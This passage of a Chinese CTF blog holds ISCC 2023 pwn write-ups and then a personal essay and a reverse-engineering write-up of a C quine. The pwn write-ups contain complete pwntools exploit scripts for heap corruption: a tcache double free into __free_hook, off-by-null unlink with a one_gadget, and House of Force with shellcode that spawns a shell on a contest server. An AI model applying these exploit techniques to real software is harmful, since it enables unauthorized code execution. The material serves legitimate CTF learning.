function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;please choose one!&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;Content of Stu:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;please choose one!&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcache_heap</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcache_bin</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        dele(i)<br><br>random = <span class="hljs-number">0x6b8b4567</span> <span class="hljs-comment">#debug to get</span><br>xor_num = <span class="hljs-number">0x15CC15CC</span><br><br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(random ^ xor_num))<br><br>add(<span class="hljs-number">2048</span>)<br>add(<span class="hljs-number">32</span>)<br>dele(<span class="hljs-number">0</span>)     <span class="hljs-comment">#unsortbin</span><br>dele(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">0</span>)     <span class="hljs-comment">#leak</span><br><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#+96</span><br>libc_base = main_arena - <span class="hljs-number">96</span> - <span class="hljs-number">0x3EBC40</span>  <span class="hljs-comment">#malloc_trim</span><br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br><span class="hljs-comment">#print(hex(main_arena))</span><br><br>tcache_heap(<span class="hljs-number">64</span>)<br>add(<span class="hljs-number">64</span>)<br>add(<span class="hljs-number">64</span>)<br>add(<span class="hljs-number">64</span>)<br><br>tcache_bin()<br><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">7</span>)<br><br>tcache_heap(<span class="hljs-number">64</span>)<br>add(<span class="hljs-number">64</span>)<br>edit(<span class="hljs-number">7</span>,p64(free_hook))<br>add(<span class="hljs-number">64</span>)<br>add(<span class="hljs-number">64</span>)<br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">64</span>)<span class="hljs-comment"># 10fake_chunk</span><br>edit(<span class="hljs-number">10</span>,p64(sys_addr))<br>dele(<span class="hljs-number">9</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="chef"><a href="#chef" class="headerlink" title="chef"></a>chef</h3><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-26.png" alt="iscc2023-26"></p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-27.png" alt="iscc2023-27"></p><p>结尾content的内容补0，用off-by-null实现unlink，unsortbin泄露基地址后，改fd实现任意地址写后malloc_hook+onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;./chef&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10031</span>)<br><span class="hljs-comment">#elf=ELF(&#x27;./chef&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">skip</span>():<br>    p.sendafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,name</span>):<br>    p.sendafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;Please enter the price of food:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Please enter the name of food:&quot;</span>,name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">index,size,name</span>):<br>    p.sendafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;Please enter the index of food:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;Please enter the price of food :&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Please enter the name of food:&quot;</span>,name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;Please enter the index of food:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">end</span>():<br>    p.sendafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br><br>skip()<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)    <span class="hljs-comment">#A,0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;BBBB&#x27;</span>)    <span class="hljs-comment">#B,1</span><br>add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;CCCC&#x27;</span>)<span class="hljs-comment">#C,2</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;DDDD&#x27;</span>)    <span class="hljs-comment">#D,3 padding to get unsortbin</span><br>remove(<span class="hljs-number">0</span>)<br><br>change(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x100</span>))<br>remove(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;EEEE&#x27;</span>)<br><br>show()  <span class="hljs-comment">#leak in 1</span><br><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#+88</span><br>libc_base = main_arena - <span class="hljs-number">88</span> - <span class="hljs-number">0x3C4B20</span> <span class="hljs-comment">#malloc_trim</span><br>malloc_hook=libc_base+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc=libc_base+libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-comment">#print(hex(main_arena))</span><br>fake_chunk = libc_base + <span class="hljs-number">0x3c4aed</span><br>gadget=[<span class="hljs-number">0x45206</span>,<span class="hljs-number">0x4525a</span>,<span class="hljs-number">0x4525a</span>,<span class="hljs-number">0xf0897</span>]<br>one_gadget = libc_base + gadget[<span class="hljs-number">2</span>]<br><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;FFFF&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;GGGG&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;HHHH&#x27;</span>)<br>remove(<span class="hljs-number">2</span>)<br>change(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,p64(fake_chunk))<br>remove(<span class="hljs-number">4</span>)<br><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;IIII&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;JJJJ&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x13</span> + p64(one_gadget))<br>p.send(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;food:&#x27;</span>,<span class="hljs-string">&#x27;16&#x27;</span>)   <span class="hljs-comment">#malloc to get shell</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="第二识势-2"><a href="#第二识势-2" class="headerlink" title="第二识势-2"></a>第二识势-2</h3><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-28.png" alt="iscc2023-28"></p><p>保护全关有读写可执行段，考虑shellcode，发现程序里提示的top联想到top_arena，Horse of force绕过check，之后栈溢出+shellcode执行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">from pwn <span class="hljs-keyword">import</span>*</span><br><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-meta">#elf = ELF(<span class="hljs-string">&#x27;./attachment-34&#x27;</span>)</span></span><br><span class="hljs-function">p </span>= <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./attachment-34&#x27;</span>)<br>p = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10025</span>)<br><span class="hljs-meta">#gdb.attach(p)</span><br><br>p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;Start injecting\n&#x27;</span>)<br><br>p.<span class="hljs-built_in">send</span>(b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>+b<span class="hljs-number">&#x27;</span>h<span class="hljs-number">&#x27;</span>*<span class="hljs-number">23</span>)<br>p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;materials\n&#x27;</span>)<br>s = p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;d&#x27;</span>,drop=True)<br>top_trunk = <span class="hljs-built_in">int</span>(s)<span class="hljs-number">-0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(top_trunk))<br>p.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;-1&#x27;</span>)<br><br>bsf = <span class="hljs-number">0x6012A0</span><br>offset = bsf <span class="hljs-number">-0x20</span><br>size = offset - top_trunk<br><span class="hljs-built_in">print</span>(size)<br>p.<span class="hljs-built_in">send</span>(<span class="hljs-built_in">str</span>(size))<br><br>p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;Answer time is close to over\n&#x27;</span>)<br>p.<span class="hljs-built_in">send</span>(b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">16</span>)<br>p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;Think about whether this is very basic\n&#x27;</span>)<br><br>shellcode = <span class="hljs-built_in">asm</span>(shellcraft.amd64.<span class="hljs-built_in">sh</span>())<br>p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;Direct to destination\n&#x27;</span>)<br>payload = shellcode.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">124</span>, b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span>) + <span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(bsf)<br><br>p.<span class="hljs-built_in">send</span>(payload)<br>p.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>B♭</title>
    <link href="/2023/05/05/what_to_do_next/"/>
    <url>/2023/05/05/what_to_do_next/</url>
    
    <content type="html"><![CDATA[<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>五一过完了，回家休息的几天也在做题，下次放假应该就要到期末结束了。</p><p>快一个月没有更新博客，当然不是忘记掉了，而是自己没有收获到什么。CTF比赛很多，一个接着一个形成了如此过程：参与-看题-不会-摆烂。少了复盘的过程，那么不会的还是不会，又怎么会有收获呢？所以要找时间把最近比赛的题目复现学习。</p><p>最近打的比赛发现，Rev写python脚本解题的需求越来越多了，一开始以为C语言写个简单解密就够了，后来发现会的越多不会的更多，我能写出来z3解题脚本已经很不容易了）还见到要写脚本从程序中提取内容，就是那种有很多重复结构，手动绝对折磨人，还有很多我不知道的用途。。。</p><p>现况比较不乐观，大概是习惯摆烂，稍微做点事就感觉累）导致这学期应该做的任务，无限的向后堆积，之后的一段时间要打比赛，要复盘，要学操作系统，还要保证期末在不挂科的基础上尽可能分高（我真的学不会数学），希望这些都能完成。</p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/sleep_megumi.png" alt="sleep_megumi" style="zoom: 80%;" /> <p>深夜写的，日常emo。说实话保持良好作息也挺重要，争取实现。</p>]]></content>
    
    
    <categories>
      
      <category>informal essay</category>
      
    </categories>
    
    
    <tags>
      
      <tag>informal essay</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记两道源代码逆向题</title>
    <link href="/2023/04/13/code/"/>
    <url>/2023/04/13/code/</url>
    
    <content type="html"><![CDATA[<p>最近遇到了两个源代码逆向题（太菜了所以只能做简单题</p><h1 id="b01lersCTF2023-Quine"><a href="#b01lersCTF2023-Quine" class="headerlink" title="b01lersCTF2023-Quine"></a>b01lersCTF2023-Quine</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">              <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-comment">/*firt*/</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br>           <span class="hljs-meta">#<span class="hljs-keyword">define</span><span class="hljs-comment">/*ah*/</span>      p<span class="hljs-comment">/**/</span>putchar</span><br>         <span class="hljs-meta">#<span class="hljs-keyword">define</span><span class="hljs-comment">/*??*/</span>         c<span class="hljs-comment">/*cal*/</span>char</span><br>        <span class="hljs-meta">#<span class="hljs-keyword">define</span><span class="hljs-comment">/*to*/</span>           Q(q)int*P,u\</span><br><span class="hljs-meta">        <span class="hljs-comment">/*why...*/</span>=0,           M[99999],*C\</span><br><span class="hljs-meta">        =M,*S=M+293;c           *Q=#q<span class="hljs-comment">/*am*/</span>\</span><br><span class="hljs-meta">        ,H[99999],*D=           H;<span class="hljs-comment">/*i*/</span>int(\</span><br><span class="hljs-meta">        main)(int*a,c           **b)&#123;q;&#125;<span class="hljs-comment">/**/</span></span><br><span class="hljs-comment">/*quine*/</span>Q(<span class="hljs-type">int</span>*B=M+<span class="hljs-number">549</span>;<span class="hljs-type">int</span><span class="hljs-comment">/*ahhh*/</span>l=<span class="hljs-built_in">strlen</span>(b[<span class="hljs-number">1</span>]);p(<span class="hljs-number">47</span>);<br>p(<span class="hljs-number">47</span>);<span class="hljs-keyword">for</span>(;*Q;Q++)&#123;<span class="hljs-keyword">if</span>(*Q==<span class="hljs-number">124</span>)*C++=<span class="hljs-number">10</span>;<span class="hljs-keyword">else</span><span class="hljs-comment">/*haaa*/</span><span class="hljs-keyword">if</span>(*Q<br>==<span class="hljs-number">126</span>)*C++=<span class="hljs-number">32</span>;<span class="hljs-keyword">else</span><span class="hljs-comment">/*wtf_is_this*/</span><span class="hljs-keyword">if</span>(*Q==<span class="hljs-number">33</span>)*C++=<span class="hljs-number">34</span>;<span class="hljs-keyword">else</span><br><span class="hljs-comment">/*woeira*/</span><span class="hljs-keyword">if</span>(*Q&gt;<span class="hljs-number">34</span>)*C++=*Q;*D++=*Q==<span class="hljs-number">32</span>?<span class="hljs-string">&#x27;\n&#x27;</span>:*Q;&#125;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span><br>u=<span class="hljs-number">-0</span>;u&lt;l*<span class="hljs-number">4</span>;)p(-b[<span class="hljs-number">1</span>][u/<span class="hljs-number">4</span>]+S[u++]-S[u++]+(S[u++]^S[u++])?<br><span class="hljs-number">88</span>:<span class="hljs-number">79</span>);p(<span class="hljs-number">10</span>);<span class="hljs-comment">/*weird___*/</span><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>*d=B;d&lt;M+<span class="hljs-number">1280</span>;)p(*d++);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s)&quot;</span>,<span class="hljs-comment">/*progra*/</span>H+<span class="hljs-number">304</span>);<span class="hljs-keyword">return</span><span class="hljs-comment">/*UwU*/</span><span class="hljs-number">0</span>**<span class="hljs-string">&quot;^O&#123;(u4X&quot;</span><br><span class="hljs-string">&quot;z&#125;e(tiIh.p+&#125;Kj&lt;&amp;eb]0@sHecW^[.xroBCW=N3nG+r.]rGEs.UJw^&quot;</span><br><span class="hljs-string">&quot;y&#x27;tn_Qv(y;Ed&#x27;)#@q@xI1N:wH&lt;X1aT)NtMvNlcY0;+x[cQ4j9&gt;Qi2&quot;</span><br><span class="hljs-string">&quot;#Yq&amp;fR#os=ELTjS^/deJZ;EuY`#IQwKL)w&lt;N&lt;Zh,;W9X=&amp;t0zX&amp;E0&quot;</span><br><span class="hljs-string">&quot;e&lt;_3SVaLs(pXk6z-XGHTx8T/?-^`h[K0h&#125;`dD6kX:vEeC,mI5fR9k&quot;</span><br><span class="hljs-string">&quot;]&#123;;yfO0Wg/1-Z^=WyUqN5XY1g25K1sJgKzfG.~~~~~~~~~~~~~~#i&quot;</span><br><span class="hljs-string">&quot;nclude/*firt*/&lt;stdio.h&gt;|~~~~~~~~~~~#define/*ah*/~~~~~&quot;</span><br><span class="hljs-string">&quot;~p/**/putchar|~~~~~~~~~#define/*??*/~~~~~~~~~c/*cal*/&quot;</span><br><span class="hljs-string">&quot;char|~~~~~~~~#define/*to*/~~~~~~~~~~~Q(q)int*P,u\|~~~&quot;</span><br><span class="hljs-string">&quot;~~~~~/*why...*/=0,~~~~~~~~~~~M[99999],*C\|~~~~~~~~=M,&quot;</span><br><span class="hljs-string">&quot;*S=M+293;c~~~~~~~~~~~*Q=#q/*am*/\|~~~~~~~~,H[99999],*&quot;</span><br><span class="hljs-string">&quot;D=~~~~~~~~~~~H;/*i*/int(\|~~~~~~~~main)(int*a,c~~~~~~&quot;</span><br><span class="hljs-string">&quot;~~~~~**b)&#123;q;&#125;/**/|/*quine*/Q(int*B=M+549;int/*ahhh*/l&quot;</span><br><span class="hljs-string">&quot;=strlen(b[1]);p(47);|p(47);for(;*Q;Q++)&#123;if(*Q==124)*C&quot;</span><br><span class="hljs-string">&quot;++=10;else/*haaa*/if(*Q|==126)*C++=32;else/*wtf_is_th&quot;</span><br><span class="hljs-string">&quot;is*/if(*Q==33)*C++=34;else|/*woeira*/if(*Q&gt;34)*C++=*Q&quot;</span><br><span class="hljs-string">&quot;;*D++=*Q==32?&#x27;\n&#x27;:*Q;&#125;for(int|u=-0;u&lt;l*4;)p(-b[1][u/4&quot;</span><br><span class="hljs-string">&quot;]+S[u++]-S[u++]+(S[u++]^S[u++])?|88:79);p(10);/*weird&quot;</span><br><span class="hljs-string">&quot;___*/for(int*d=B;d&lt;M+1280;)p(*d++);|printf(!%s)!,/*pr&quot;</span><br><span class="hljs-string">&quot;ogra*/H+304);return/*UwU*//*quine*/Q(/*random_stuf*/&quot;</span>)<br></code></pre></td></tr></table></figure><p>代码太乱了，题目好像描述是IOCCC，看着确实挺像。从题目名字能看出一些东西。</p><p>Quine是指能够输出自身源代码的计算机程序。简单来说，Quine程序就是一个能够输出自己的代码的程序。</p><p>手动整理代码…还是算了，让gpt帮我整理一下，顺便把ascii码换成字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> p putchar</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> c char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Q(q) int *P,u=0,M[99999],*C=M,*S=M+293;c *Q=#q,H[99999],*D=H;int(main)(int* a,c **b)&#123;q;&#125;</span><br>Q(<br><span class="hljs-type">int</span> *B = M + <span class="hljs-number">549</span>;<span class="hljs-type">int</span> l = <span class="hljs-built_in">strlen</span>(b[<span class="hljs-number">1</span>]);<br>p(<span class="hljs-string">&#x27;/&#x27;</span>);<br>p(<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-keyword">for</span> (; *Q; Q++) &#123;<br>    <span class="hljs-keyword">if</span> (*Q == <span class="hljs-string">&#x27;|&#x27;</span>)&#123;<br>        *C++ = <span class="hljs-string">&#x27;\n&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*Q == <span class="hljs-string">&#x27;~&#x27;</span>)&#123;<br>        *C++ = <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*Q == <span class="hljs-string">&#x27;!&#x27;</span>)&#123;<br>        *C++ = <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*Q &gt; <span class="hljs-string">&#x27;&quot;&#x27;</span>)&#123;<br>        *C++ = *Q;<br>    &#125;<br>    *D++ = *Q == <span class="hljs-string">&#x27; &#x27;</span> ? <span class="hljs-string">&#x27;\n&#x27;</span> : *Q;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> u = <span class="hljs-number">-0</span>; u &lt; l * <span class="hljs-number">4</span>;) &#123;<br>    p(-b[<span class="hljs-number">1</span>][u / <span class="hljs-number">4</span>] + S[u++] - S[u++] + (S[u++] ^ S[u++]) ? <span class="hljs-string">&#x27;X&#x27;</span> : <span class="hljs-string">&#x27;O&#x27;</span>);<br>&#125;<br>p(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> *d = B; d &lt; M + <span class="hljs-number">1280</span>;)&#123;<br>    p(*d++);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s)&quot;</span>,<span class="hljs-comment">/*progra*/</span>H + <span class="hljs-number">304</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span> * *<span class="hljs-string">&quot;^O&#123;(u4X&quot;</span><br><span class="hljs-string">&quot;z&#125;e(tiIh.p+&#125;Kj&lt;&amp;eb]0@sHecW^[.xroBCW=N3nG+r.]rGEs.UJw^&quot;</span><br><span class="hljs-string">&quot;y&#x27;tn_Qv(y;Ed&#x27;)#@q@xI1N:wH&lt;X1aT)NtMvNlcY0;+x[cQ4j9&gt;Qi2&quot;</span><br><span class="hljs-string">&quot;#Yq&amp;fR#os=ELTjS^/deJZ;EuY`#IQwKL)w&lt;N&lt;Zh,;W9X=&amp;t0zX&amp;E0&quot;</span><br><span class="hljs-string">&quot;e&lt;_3SVaLs(pXk6z-XGHTx8T/?-^`h[K0h&#125;`dD6kX:vEeC,mI5fR9k&quot;</span><br><span class="hljs-string">&quot;]&#123;;yfO0Wg/1-Z^=WyUqN5XY1g25K1sJgKzfG.~~~~~~~~~~~~~~#i&quot;</span><br><span class="hljs-string">&quot;nclude/*firt*/&lt;stdio.h&gt;|~~~~~~~~~~~#define/*ah*/~~~~~&quot;</span><br><span class="hljs-string">&quot;~p/**/putchar|~~~~~~~~~#define/*??*/~~~~~~~~~c/*cal*/&quot;</span><br><span class="hljs-string">&quot;char|~~~~~~~~#define/*to*/~~~~~~~~~~~Q(q)int*P,u\|~~~&quot;</span><br><span class="hljs-string">&quot;~~~~~/*why...*/=0,~~~~~~~~~~~M[99999],*C\|~~~~~~~~=M,&quot;</span><br><span class="hljs-string">&quot;*S=M+293;c~~~~~~~~~~~*Q=#q/*am*/\|~~~~~~~~,H[99999],*&quot;</span><br><span class="hljs-string">&quot;D=~~~~~~~~~~~H;/*i*/int(\|~~~~~~~~main)(int*a,c~~~~~~&quot;</span><br><span class="hljs-string">&quot;~~~~~**b)&#123;q;&#125;/**/|/*quine*/Q(int*B=M+549;int/*ahhh*/l&quot;</span><br><span class="hljs-string">&quot;=strlen(b[1]);p(47);|p(47);for(;*Q;Q++)&#123;if(*Q==124)*C&quot;</span><br><span 